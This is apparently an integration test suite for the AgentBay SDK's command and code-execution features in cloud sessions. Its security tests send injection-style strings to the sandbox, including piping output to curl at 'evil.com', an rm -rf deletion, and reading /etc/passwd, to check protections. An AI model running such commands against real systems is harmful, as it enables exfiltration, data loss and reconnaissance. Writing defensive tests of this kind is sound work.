import os
import unittest
import time
import concurrent.futures
import threading

from agentbay import AgentBay
from agentbay.command.command import CommandResult
from agentbay.code.code import CodeExecutionResult
from agentbay.session_params import CreateSessionParams

class TestCommandComprehensive(unittest.TestCase):
    """
    Command Comprehensive Tests - 命令综合测试

    This test suite covers comprehensive command execution operations including:
    1. ExecuteCommand Function Tests (命令执行功能测试)
    2. RunCode Function Tests (代码运行功能测试)
    3. Concurrent Execution Tests (并发执行测试)
    4. Performance Tests (性能测试)
    5. Security Tests (安全性测试)
    6. Boundary Tests (边界测试)
    7. Data Integrity Tests (数据完整性测试)
    """

    @classmethod
    def setUpClass(cls):
        """Set up test environment before all tests."""
        # Get API key from environment
        cls.api_key = os.getenv("AGENTBAY_API_KEY")
        if not cls.api_key:
            raise unittest.SkipTest("AGENTBAY_API_KEY environment variable not set")

        # Initialize AgentBay client
        cls.agent_bay = AgentBay(cls.api_key)

        # Create a session with code_latest image to support both command and code execution
        print("Creating a new session for Command comprehensive testing...")
        params = CreateSessionParams(
            image_id="code_latest",
        )
        result = cls.agent_bay.create(params)
        if not result.success or not result.session:
            raise unittest.SkipTest("Failed to create session")

        cls.session = result.session
        cls.command = cls.session.command
        cls.code = cls.session.code
        print(f"Session created with ID: {cls.session.session_id}")

    @classmethod
    def tearDownClass(cls):
        """Clean up test environment after all tests."""
        print("Cleaning up: Deleting the session...")
        if hasattr(cls, "session"):
            try:
                result = cls.agent_bay.delete(cls.session)
                if result.success:
                    print("Session successfully deleted")
                else:
                    print(f"Warning: Error deleting session: {result.error_message}")
            except Exception as e:
                print(f"Warning: Error deleting session: {e}")

    # 1. ExecuteCommand Function Tests (命令执行功能测试)
    def test_1_1_tc_cmd_001_basic_shell_command_execution(self):
        """TC-CMD-001: 基础Shell命令执行 - should successfully execute basic shell commands"""
        # 前提条件: AgentBay实例已创建且连接正常，Session已成功建立，Command对象已初始化
        # 测试目标: 验证基础shell命令的正确执行

        start_time = time.time()
        result = self.command.execute_command("echo 'Hello World'", 1000)
        execution_time = (time.time() - start_time) * 1000

        # 验证点
        self.assertIsInstance(result, CommandResult)
        self.assertTrue(result.success)
        self.assertIn("Hello World", result.output)
        self.assertIsNotNone(result.request_id)
        self.assertNotEqual(result.request_id, "")
        self.assertGreater(execution_time, 0)  # 执行时间应该大于0

        print(f"TC-CMD-001 execution time: {execution_time:.2f}ms")

    def test_1_2_tc_cmd_002_file_operation_command_execution(self):
        """TC-CMD-002: 文件操作命令执行 - should execute file creation, reading, and deletion commands"""
        # 前提条件: Session环境已准备，有文件系统访问权限
        # 测试目标: 验证文件创建、读取、删除命令的执行

        test_content = "test content"
        test_file = "/tmp/test_file.txt"

        # 步骤1: 执行创建文件命令
        create_result = self.command.execute_command(f"echo '{test_content}' > {test_file}")
        self.assertTrue(create_result.success)

        # 步骤2: 执行读取文件命令
        read_result = self.command.execute_command(f"cat {test_file}")
        self.assertTrue(read_result.success)
        self.assertEqual(read_result.output.strip(), test_content)

        # 步骤3: 执行删除文件命令
        delete_result = self.command.execute_command(f"rm {test_file}")
        self.assertTrue(delete_result.success)

        # 步骤4: 验证文件删除
        verify_result = self.command.execute_command(f"ls {test_file}")
        self.assertFalse(verify_result.success)  # 文件不存在应该返回错误

    def test_1_3_tc_cmd_003_timeout_mechanism_verification(self):
        """TC-CMD-003: 超时机制验证 - should verify command execution timeout control mechanism"""
        # 前提条件: Session环境已准备，系统支持sleep命令
        # 测试目标: 验证命令执行超时控制机制

        timeout_ms = 1000
        start_time = time.time()

        result = self.command.execute_command("sleep 5", timeout_ms)
        actual_time = (time.time() - start_time) * 1000

        # 验证点
        self.assertFalse(result.success)
        self.assertLess(actual_time, 6000)  # 应该在5秒内被中断
        self.assertGreater(actual_time, timeout_ms * 0.8)  # 接近超时时间

        print(f"TC-CMD-003 actual execution time: {actual_time:.2f}ms, timeout: {timeout_ms}ms")

    def test_1_4_tc_cmd_004_error_command_handling(self):
        """TC-CMD-004: 错误命令处理 - should handle invalid command error processing"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证无效命令的错误处理机制

        result = self.command.execute_command("invalid_command_xyz")

        # 验证点
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertNotEqual(result.error_message, "")

        print(f"TC-CMD-004 error message: {result.error_message}")

    # 2. RunCode Function Tests (代码运行功能测试)
    def test_2_1_tc_code_001_python_code_execution(self):
        """TC-CODE-001: Python代码执行 - should verify correct execution of Python code"""
        # 前提条件: Session环境已准备，Python运行环境可用
        # 测试目标: 验证Python代码的正确执行

        python_code = "print('Hello from Python')"
        result = self.code.run_code(python_code, "python", 60)

        # 验证点
        self.assertIsInstance(result, CodeExecutionResult)
        self.assertTrue(result.success)
        self.assertIn("Hello from Python", result.result)
        self.assertIsNotNone(result.request_id)

        print(f"TC-CODE-001 result: {result.result}")

    def test_2_2_tc_code_002_javascript_code_execution(self):
        """TC-CODE-002: JavaScript代码执行 - should verify correct execution of JavaScript code"""
        # 前提条件: Session环境已准备，JavaScript运行环境可用
        # 测试目标: 验证JavaScript代码的正确执行

        js_code = "console.log('Hello from JavaScript')"
        result = self.code.run_code(js_code, "javascript", 60)

        # 验证点
        self.assertTrue(result.success)
        self.assertIn("Hello from JavaScript", result.result)
        self.assertIsNotNone(result.request_id)

        print(f"TC-CODE-002 result: {result.result}")

    def test_2_3_tc_code_003_complex_python_code_execution(self):
        """TC-CODE-003: 复杂Python代码执行 - should verify execution of Python code with data processing"""
        # 前提条件: Session环境已准备，Python标准库可用
        # 测试目标: 验证包含数据处理的Python代码执行

        complex_python_code = """
import json
data = [1, 2, 3, 4, 5]
result = sum(data)
print(json.dumps({"sum": result, "count": len(data)}))
        """.strip()

        result = self.code.run_code(complex_python_code, "python", 300)

        # 验证点
        self.assertTrue(result.success)

        # 解析JSON输出
        import re
        import json
        json_match = re.search(r'\{.*\}', result.result)
        self.assertIsNotNone(json_match)

        if json_match:
            parsed_result = json.loads(json_match.group(0))
            self.assertEqual(parsed_result["sum"], 15)
            self.assertEqual(parsed_result["count"], 5)

        print(f"TC-CODE-003 result: {result.result}")

    def test_2_4_tc_code_004_code_execution_timeout_control(self):
        """TC-CODE-004: 代码执行超时控制 - should verify code execution timeout control mechanism"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证代码执行的超时控制机制

        long_running_code = "import time; time.sleep(10)"
        timeout_seconds = 5
        start_time = time.time()

        result = self.code.run_code(long_running_code, "python", timeout_seconds)
        actual_time = (time.time() - start_time) * 1000

        # 验证点
        self.assertFalse(result.success)
        self.assertLess(actual_time, 15000)  # 应该在15秒内完成（包含一些网络延迟）
        self.assertGreater(actual_time, timeout_seconds * 1000 * 0.5)  # 接近超时时间

        print(f"TC-CODE-004 actual time: {actual_time:.2f}ms, timeout: {timeout_seconds}s")

    def test_2_5_tc_code_005_unsupported_language_handling(self):
        """TC-CODE-005: 不支持语言处理 - should handle unsupported language error processing"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证不支持语言的错误处理

        result = self.code.run_code('System.out.println("Hello");', "java", 60)

        # 验证点
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertIn("language", result.error_message.lower())

        print(f"TC-CODE-005 error: {result.error_message}")

    def test_2_6_tc_code_006_code_syntax_error_handling(self):
        """TC-CODE-006: 代码语法错误处理 - should handle syntax error code processing"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证语法错误代码的处理

        syntax_error_code = "print('unclosed string"
        result = self.code.run_code(syntax_error_code, "python", 60)

        # 验证点
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertTrue(
            "syntax" in result.error_message.lower() or
            "error" in result.error_message.lower()
        )

        print(f"TC-CODE-006 syntax error: {result.error_message}")

    # 3. Concurrent Execution Tests (并发执行测试)
    def test_3_1_tc_concurrent_001_concurrent_command_execution(self):
        """TC-CONCURRENT-001: 并发命令执行 - should verify concurrent command execution capability"""
        # 前提条件: 多个Session已建立，系统支持并发操作
        # 测试目标: 验证多个命令的并发执行能力

        # 创建多个会话（使用默认镜像，命令执行不需要code_latest）
        sessions = []
        agent_bays = []

        try:
            for i in range(3):
                ab = AgentBay(self.api_key)
                params = CreateSessionParams()
                session_result = ab.create(params)
                self.assertTrue(session_result.success)

                agent_bays.append(ab)
                sessions.append(session_result.session)

            # 并发执行不同命令
            commands = [
                "echo 'Command 1'",
                "echo 'Command 2'",
                "echo 'Command 3'"
            ]

            start_time = time.time()

            def execute_command_task(session, command):
                return session.command.execute_command(command)

            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = [
                    executor.submit(execute_command_task, sessions[i], commands[i])
                    for i in range(3)
                ]
                results = [future.result() for future in concurrent.futures.as_completed(futures)]

            concurrent_time = (time.time() - start_time) * 1000

            # 验证点
            for i, result in enumerate(results):
                self.assertTrue(result.success)
                # 检查输出是否包含对应的命令结果
                found_match = False
                for j in range(1, 4):
                    if f"Command {j}" in result.output:
                        found_match = True
                        break
                self.assertTrue(found_match, f"Result {i} should contain a command output")

            print(f"TC-CONCURRENT-001 concurrent execution time: {concurrent_time:.2f}ms")

        finally:
            # 清理会话
            for i in range(len(sessions)):
                try:
                    agent_bays[i].delete(sessions[i])
                except Exception as e:
                    print(f"Warning: Error deleting session {i}: {e}")

    def test_3_2_tc_concurrent_002_mixed_code_concurrent_execution(self):
        """TC-CONCURRENT-002: 混合代码并发执行 - should verify concurrent execution of different language codes"""
        # 前提条件: Session已建立，Python和JavaScript环境都可用
        # 测试目标: 验证不同语言代码的并发执行

        python_code = "print('Python result')"
        js_code = "console.log('JavaScript result')"

        start_time = time.time()

        def run_code_task(code, language):
            return self.code.run_code(code, language, 60)

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            python_future = executor.submit(run_code_task, python_code, "python")
            js_future = executor.submit(run_code_task, js_code, "javascript")

            python_result = python_future.result()
            js_result = js_future.result()

        concurrent_time = (time.time() - start_time) * 1000

        # 验证点
        self.assertTrue(python_result.success)
        self.assertTrue(js_result.success)
        self.assertIn("Python result", python_result.result)
        self.assertIn("JavaScript result", js_result.result)

        print(f"TC-CONCURRENT-002 mixed execution time: {concurrent_time:.2f}ms")

    # 4. Performance Tests (性能测试)
    def test_4_1_tc_perf_001_command_execution_performance_baseline(self):
        """TC-PERF-001: 命令执行性能基线 - should establish command execution performance baseline"""
        # 前提条件: 稳定的测试环境，无其他高负载任务
        # 测试目标: 建立命令执行性能基线

        iterations = 10  # 减少迭代次数以适应测试环境
        execution_times = []
        success_count = 0

        for i in range(iterations):
            start_time = time.time()
            result = self.command.execute_command(f"echo 'Test {i}'")
            execution_time = (time.time() - start_time) * 1000

            execution_times.append(execution_time)
            if result.success:
                success_count += 1

        # 计算统计数据
        avg_time = sum(execution_times) / len(execution_times)
        max_time = max(execution_times)
        min_time = min(execution_times)
        sorted_times = sorted(execution_times)
        p99_time = sorted_times[int(0.99 * len(sorted_times))]

        # 验证点
        self.assertLess(avg_time, 5000)  # 调整为5秒以适应网络延迟
        self.assertLess(p99_time, 10000)  # 99%请求在10秒内完成
        self.assertGreaterEqual(success_count / iterations, 0.8)  # 80%成功率

        print(f"TC-PERF-001 Performance: Avg={avg_time:.2f}ms, Min={min_time:.2f}ms, "
              f"Max={max_time:.2f}ms, P99={p99_time:.2f}ms, Success={success_count}/{iterations}")

    def test_4_2_tc_perf_002_code_execution_performance_test(self):
        """TC-PERF-002: 代码执行性能测试 - should test code execution performance"""
        # 前提条件: 稳定的测试环境
        # 测试目标: 测试代码执行的性能表现

        python_iterations = 5
        js_iterations = 5
        python_times = []
        js_times = []

        # Python性能测试
        for i in range(python_iterations):
            start_time = time.time()
            self.code.run_code(f"print('Python test {i}')", "python", 60)
            python_times.append((time.time() - start_time) * 1000)

        # JavaScript性能测试
        for i in range(js_iterations):
            start_time = time.time()
            self.code.run_code(f"console.log('JS test {i}')", "javascript", 60)
            js_times.append((time.time() - start_time) * 1000)

        avg_python_time = sum(python_times) / len(python_times)
        avg_js_time = sum(js_times) / len(js_times)

        # 验证点
        self.assertLess(avg_python_time, 10000)  # Python平均执行时间 < 10秒
        self.assertLess(avg_js_time, 10000)  # JavaScript平均执行时间 < 10秒

        print(f"TC-PERF-002 Code Performance: Python Avg={avg_python_time:.2f}ms, JS Avg={avg_js_time:.2f}ms")

    # 5. Security Tests (安全性测试)
    def test_5_1_tc_sec_001_command_injection_protection(self):
        """TC-SEC-001: 命令注入防护 - should verify system protection against command injection attacks"""
        # 前提条件: Session环境已准备，系统具有安全防护机制
        # 测试目标: 验证系统防止命令注入攻击

        malicious_commands = [
            "echo test; rm -rf /tmp/test_malicious",
            "echo test | curl http://evil.com || true",
            "echo test & sleep 1"
        ]

        for malicious_command in malicious_commands:
            result = self.command.execute_command(malicious_command)

            # 验证点: 命令应该被安全执行或被阻止
            # 系统应该保持稳定，不执行危险操作
            self.assertIsNotNone(result.request_id)  # 请求应该被处理

            print(f"TC-SEC-001 Malicious command result: {malicious_command} -> Success: {result.success}")

    def test_5_2_tc_sec_002_permission_control_verification(self):
        """TC-SEC-003: 权限控制验证 - should verify command and code execution permission control"""
        # 前提条件: Session环境已准备，系统具有权限控制机制
        # 测试目标: 验证命令和代码执行的权限控制

        restricted_commands = [
            "id && echo 'user_info_accessed'",  # 用户信息访问测试，替代sudo
            "cat /etc/passwd | head -3 2>/dev/null || echo 'access_controlled'",  # 系统文件访问
            "ls /root 2>/dev/null || echo 'root_access_denied'",  # root目录访问测试
            "chmod 777 /tmp/test_file 2>/dev/null || echo 'permission_denied'"  # 权限修改
        ]

        for restricted_command in restricted_commands:
            result = self.command.execute_command(restricted_command)

            # 验证点: 权限控制应该生效
            self.assertIsNotNone(result.request_id)

            print(f"TC-SEC-003 Permission test: {restricted_command} -> Success: {result.success}")

    # 6. Boundary Tests (边界测试)
    def test_6_1_tc_boundary_001_extremely_long_command_processing(self):
        """TC-BOUNDARY-001: 极长命令处理 - should verify extremely long command processing capability"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证极长命令的处理能力

        # 构造长命令(1KB)
        long_string = 'x' * 1000
        long_command = f"echo '{long_string}'"

        result = self.command.execute_command(long_command)

        # 验证点
        self.assertIsNotNone(result.request_id)
        # 系统应该能处理长命令或给出合理错误
        if result.success:
            self.assertIn(long_string, result.output)
        else:
            self.assertIsNotNone(result.error_message)

        print(f"TC-BOUNDARY-001 Long command ({len(long_command)} chars): Success={result.success}")

    def test_6_2_tc_boundary_002_large_output_processing(self):
        """TC-BOUNDARY-002: 大量输出处理 - should verify large output processing capability"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证大量输出的处理能力

        # 生成大量输出的命令
        result = self.command.execute_command("seq 1 100")  # 输出1-100

        # 验证点
        self.assertIsNotNone(result.request_id)
        if result.success:
            self.assertGreater(len(result.output.split('\n')), 50)

        print(f"TC-BOUNDARY-002 Large output: Success={result.success}, Output length={len(result.output)}")

    def test_6_3_tc_boundary_003_special_character_processing(self):
        """TC-BOUNDARY-003: 特殊字符处理 - should verify special character and encoding processing"""
        # 前提条件: Session环境已准备
        # 测试目标: 验证特殊字符和编码的处理

        special_chars = [
            "echo 'Special: !@#$%^&*()'",
            "echo 'Unicode: 你好世界 🌍'",
            "echo Quotes: 'double' and 'single'",
            "echo 'Newlines:\nand\ttabs'"
        ]

        for special_command in special_chars:
            result = self.command.execute_command(special_command)

            # 验证点
            self.assertIsNotNone(result.request_id)

            print(f"TC-BOUNDARY-003 Special chars: {special_command} -> Success={result.success}")

    # 7. Data Integrity Tests (数据完整性测试)
    def test_7_1_maintain_command_execution_consistency(self):
        """7.1 Data Integrity Tests - should maintain command execution consistency"""
        # 验证命令执行的一致性
        test_command = "echo 'consistency test'"
        iterations = 5
        results = []

        for i in range(iterations):
            result = self.command.execute_command(test_command)
            self.assertTrue(result.success)
            results.append(result.output.strip())

        # 验证所有结果应该一致
        first_result = results[0]
        for result in results:
            self.assertEqual(result, first_result)

        print(f"Data integrity test: All {iterations} executions returned consistent results")

    def test_7_2_handle_session_state_correctly(self):
        """7.2 Data Integrity Tests - should handle session state correctly"""
        # 验证会话状态的正确处理
        self.assertIsNotNone(self.session.session_id)
        self.assertNotEqual(self.session.session_id, "")
        self.assertIsNotNone(self.command)
        self.assertIsNotNone(self.code)

        # 验证命令对象与会话的关联
        result = self.command.execute_command("echo 'session test'")
        self.assertTrue(result.success)
        self.assertIsNotNone(result.request_id)

        print(f"Session state test: SessionId={self.session.session_id}, Command available={self.command is not None}")

if __name__ == "__main__":
    unittest.main()
